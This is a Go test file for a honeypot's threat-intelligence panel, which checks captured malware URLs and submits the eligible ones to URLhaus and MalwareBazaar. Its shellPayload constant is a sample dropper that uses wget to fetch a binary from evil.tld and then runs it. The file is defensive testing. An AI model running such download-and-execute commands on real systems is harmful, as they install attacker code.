package web

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/settings"
	"github.com/networkshard/shardlure/internal/store"
)

// seedURLhausArtifact writes a real file so bazaar.Classify can determine a
// file kind (Vet rejects unclassifiable blobs), plus the matching artifact row.
func seedURLhausArtifact(t *testing.T, s *Server, dir, name, url, content string, age time.Duration) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
	if err := s.st.RecordArtifact(store.Artifact{
		TS:        time.Now().UTC().Add(-age),
		URL:       url,
		Origin:    "quarantine_fetch",
		Status:    "fetched",
		SHA256:    name,
		SizeBytes: int64(len(content)),
		LocalPath: path,
	}); err != nil {
		t.Fatalf("record artifact: %v", err)
	}
	return path
}

const shellPayload = "#!/bin/sh\n# dropper\ncd /tmp; wget http://evil.tld/x86; chmod +x x86; ./x86\n" +
	"# padding to clear the 64-byte floor ------------------------------\n"

func TestURLhausPanelSurfacesVetDecisions(t *testing.T) {
	s := newIntelTestServer(t, nil)
	dir := t.TempDir()

	// Eligible: a real shell dropper fetched an hour ago.
	seedURLhausArtifact(t, s, dir, "aaa1", "http://evil.tld/install.sh", shellPayload, time.Hour)
	// Ineligible: private IP host — must be REPORTED with a reason, not hidden.
	seedURLhausArtifact(t, s, dir, "bbb2", "http://10.0.0.5/install.sh", shellPayload, time.Hour)

	w := httptest.NewRecorder()
	s.handleIntelURLhaus(w, httptest.NewRequest(http.MethodGet, "/api/intel/urlhaus", nil))
	if w.Code != http.StatusOK {
		t.Fatalf("code = %d: %s", w.Code, w.Body.String())
	}
	var out urlhausResponse
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v", err)
	}

	if len(out.Candidates) != 2 {
		t.Fatalf("candidates = %d, want 2 (both shown, one rejected): %+v", len(out.Candidates), out.Candidates)
	}
	byURL := map[string]urlhausCandidateRow{}
	for _, c := range out.Candidates {
		byURL[c.URL] = c
	}
	good := byURL["http://evil.tld/install.sh"]
	if !good.Eligible {
		t.Errorf("public dropper should be eligible, got reason %q", good.Reason)
	}
	if good.FileKind == "" {
		t.Error("expected a classified file kind")
	}
	bad := byURL["http://10.0.0.5/install.sh"]
	if bad.Eligible {
		t.Error("private-IP URL must not be eligible")
	}
	if !strings.Contains(bad.Reason, "private") {
		t.Errorf("rejection reason should explain why, got %q", bad.Reason)
	}
	if out.Eligible != 1 {
		t.Errorf("eligible count = %d, want 1", out.Eligible)
	}
}

// The single most important invariant of this change: ONE abuse.ch key arms
// BOTH services. Setting the MalwareBazaar key must make URLhaus configured.
func TestOneAbuseCHKeyArmsBothServices(t *testing.T) {
	s := newIntelTestServer(t, nil)

	if s.abuseCHKeyLive() != "" || s.bazaarKeyLive() != "" {
		t.Fatal("expected no key initially")
	}
	urlhausConfigured := func() bool {
		w := httptest.NewRecorder()
		s.handleIntelURLhaus(w, httptest.NewRequest(http.MethodGet, "/api/intel/urlhaus", nil))
		var out urlhausResponse
		if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
			t.Fatalf("decode: %v", err)
		}
		return out.Configured
	}
	if urlhausConfigured() {
		t.Error("URLhaus should report unconfigured with no key")
	}

	// Set ONLY the MalwareBazaar key.
	if err := s.keys.Set(settings.KeyBazaar, "abusech-shared-key"); err != nil {
		t.Fatalf("set key: %v", err)
	}
	if got := s.abuseCHKeyLive(); got != "abusech-shared-key" {
		t.Errorf("abuseCHKeyLive = %q", got)
	}
	if s.bazaarKeyLive() != s.abuseCHKeyLive() {
		t.Error("bazaarKeyLive and abuseCHKeyLive must resolve identically")
	}
	if !urlhausConfigured() {
		t.Error("the MalwareBazaar key must arm URLhaus too (one abuse.ch account = one key)")
	}

	// The alternate env-style key name must work for both as well.
	if err := s.keys.Clear(settings.KeyBazaar); err != nil {
		t.Fatalf("clear: %v", err)
	}
	if err := s.keys.Set(settings.KeyBazaarAlt, "alt-key"); err != nil {
		t.Fatalf("set alt: %v", err)
	}
	if got := s.abuseCHKeyLive(); got != "alt-key" {
		t.Errorf("alt key not honoured: %q", got)
	}
	if !urlhausConfigured() {
		t.Error("alt key should arm URLhaus too")
	}
}

// The settings status must show BOTH services armed off the single key, so the
// operator can see at a glance that one paste lit up two integrations.
func TestSettingsStatusArmsBazaarAndURLhausTogether(t *testing.T) {
	s := newIntelTestServer(t, nil)

	armedFor := func(label string) bool {
		w := httptest.NewRecorder()
		s.handleSettingsStatus(w, httptest.NewRequest(http.MethodGet, "/api/settings/status", nil))
		if w.Code != http.StatusOK {
			t.Fatalf("status code = %d: %s", w.Code, w.Body.String())
		}
		var out struct {
			Providers []struct {
				Label string `json:"label"`
				Armed bool   `json:"armed"`
			} `json:"providers"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
			t.Fatalf("decode status: %v", err)
		}
		for _, p := range out.Providers {
			if p.Label == label {
				return p.Armed
			}
		}
		t.Fatalf("provider %q not present in status: %s", label, w.Body.String())
		return false
	}

	if armedFor("MalwareBazaar") || armedFor("URLhaus") {
		t.Fatal("neither should be armed without a key")
	}
	if err := s.keys.Set(settings.KeyBazaar, "k"); err != nil {
		t.Fatalf("set: %v", err)
	}
	if !armedFor("MalwareBazaar") {
		t.Error("MalwareBazaar should be armed")
	}
	if !armedFor("URLhaus") {
		t.Error("URLhaus must be armed by the same key")
	}
}

func TestURLhausSubmitRequiresKeyAndPOST(t *testing.T) {
	s := newIntelTestServer(t, nil)

	// GET is rejected.
	w := httptest.NewRecorder()
	s.handleURLhausSubmit(w, httptest.NewRequest(http.MethodGet, "/api/intel/urlhaus/submit", nil))
	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("GET code = %d, want 405", w.Code)
	}

	// No key -> 400 with a message pointing at the shared key.
	w = httptest.NewRecorder()
	s.handleURLhausSubmit(w, httptest.NewRequest(http.MethodPost, "/api/intel/urlhaus/submit", nil))
	if w.Code != http.StatusBadRequest {
		t.Fatalf("code = %d, want 400", w.Code)
	}
	var out urlhausSubmitResponse
	_ = json.Unmarshal(w.Body.Bytes(), &out)
	if !strings.Contains(out.Error, "MalwareBazaar") {
		t.Errorf("error should mention the shared key, got %q", out.Error)
	}
}

// A hand-crafted ?url= for something the gate rejects must be refused — the
// button is not a policy bypass.
func TestURLhausSubmitRejectsIneligibleURL(t *testing.T) {
	s := newIntelTestServer(t, map[string]string{settings.KeyBazaar: "k"})
	dir := t.TempDir()
	seedURLhausArtifact(t, s, dir, "ccc3", "http://10.0.0.5/install.sh", shellPayload, time.Hour)

	w := httptest.NewRecorder()
	s.handleURLhausSubmit(w, httptest.NewRequest(http.MethodPost,
		"/api/intel/urlhaus/submit?url=http%3A%2F%2F10.0.0.5%2Finstall.sh", nil))
	if w.Code != http.StatusBadRequest {
		t.Fatalf("code = %d, want 400 (ineligible)", w.Code)
	}
	var out urlhausSubmitResponse
	_ = json.Unmarshal(w.Body.Bytes(), &out)
	if out.Submitted != 0 {
		t.Errorf("submitted = %d, want 0", out.Submitted)
	}

	// And an unknown URL is likewise refused.
	w = httptest.NewRecorder()
	s.handleURLhausSubmit(w, httptest.NewRequest(http.MethodPost,
		"/api/intel/urlhaus/submit?url=http%3A%2F%2Fnot-a-candidate.tld%2Fx", nil))
	if w.Code != http.StatusBadRequest {
		t.Errorf("unknown url code = %d, want 400", w.Code)
	}
}

// End-to-end through the button: only the vetted URL reaches the wire, and it
// lands in the dedup ledger.
func TestURLhausSubmitAllSendsOnlyVettedURLs(t *testing.T) {
	var bodies []string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		buf := make([]byte, 1<<16)
		n, _ := r.Body.Read(buf)
		bodies = append(bodies, string(buf[:n]))
		_, _ = w.Write([]byte(`{"query_status":"ok"}`))
	}))
	defer upstream.Close()

	s := newIntelTestServer(t, map[string]string{
		settings.KeyBazaar:          "k",
		settings.KeyURLhausEndpoint: upstream.URL,
	})
	dir := t.TempDir()
	seedURLhausArtifact(t, s, dir, "ddd4", "http://evil.tld/good.sh", shellPayload, time.Hour)
	seedURLhausArtifact(t, s, dir, "eee5", "http://127.0.0.1/bad.sh", shellPayload, time.Hour)

	w := httptest.NewRecorder()
	s.handleURLhausSubmit(w, httptest.NewRequest(http.MethodPost, "/api/intel/urlhaus/submit", nil))
	if w.Code != http.StatusOK {
		t.Fatalf("code = %d: %s", w.Code, w.Body.String())
	}
	var out urlhausSubmitResponse
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if out.Submitted != 1 {
		t.Fatalf("submitted = %d, want 1: %+v", out.Submitted, out)
	}
	if len(bodies) != 1 {
		t.Fatalf("upstream batches = %d, want 1", len(bodies))
	}
	if !strings.Contains(bodies[0], "http://evil.tld/good.sh") {
		t.Errorf("vetted URL missing from body: %s", bodies[0])
	}
	if strings.Contains(bodies[0], "127.0.0.1") {
		t.Errorf("loopback URL leaked to URLhaus: %s", bodies[0])
	}
	if strings.Contains(bodies[0], "\"threat\":\"malware_download\"") == false {
		t.Errorf("threat field missing/incorrect: %s", bodies[0])
	}

	// Recorded in the ledger, so a second run submits nothing.
	if done, _ := s.st.URLhausSubmitted("http://evil.tld/good.sh"); !done {
		t.Error("submitted URL should be in the dedup ledger")
	}
	w = httptest.NewRecorder()
	s.handleURLhausSubmit(w, httptest.NewRequest(http.MethodPost, "/api/intel/urlhaus/submit", nil))
	var again urlhausSubmitResponse
	_ = json.Unmarshal(w.Body.Bytes(), &again)
	if again.Submitted != 0 {
		t.Errorf("re-submit sent %d, want 0", again.Submitted)
	}
	if len(bodies) != 1 {
		t.Errorf("upstream saw %d batches after re-run, want 1", len(bodies))
	}
}

// The live knobs must be settable from the Settings panel and clamp sanely.
func TestURLhausLiveKnobs(t *testing.T) {
	s := newIntelTestServer(t, nil)
	s.urlhausEndpointDefault = "https://urlhaus.abuse.ch/api/"
	s.urlhausTagsDefault = []string{"shardlure", "honeypot"}
	s.urlhausActiveDaysDefault = 3

	if got := s.urlhausEndpointLive(); got != "https://urlhaus.abuse.ch/api/" {
		t.Errorf("default endpoint = %q", got)
	}
	if got := s.urlhausActiveDaysLive(); got != 3 {
		t.Errorf("default activeDays = %d", got)
	}
	if err := s.keys.Set(settings.KeyURLhausActiveDays, "1"); err != nil {
		t.Fatalf("set: %v", err)
	}
	if got := s.urlhausActiveDaysLive(); got != 1 {
		t.Errorf("activeDays = %d, want 1", got)
	}
	// Out-of-range must clamp to the safe default, never loosen the window.
	if err := s.keys.Set(settings.KeyURLhausActiveDays, "90"); err != nil {
		t.Fatalf("set: %v", err)
	}
	if got := s.urlhausActiveDaysLive(); got != 3 {
		t.Errorf("activeDays = %d, want clamp to 3", got)
	}
	if err := s.keys.Set(settings.KeyURLhausTags, "alpha, beta"); err != nil {
		t.Fatalf("set tags: %v", err)
	}
	if got := s.urlhausTagsLive(); len(got) != 2 || got[0] != "alpha" {
		t.Errorf("tags = %v", got)
	}
}
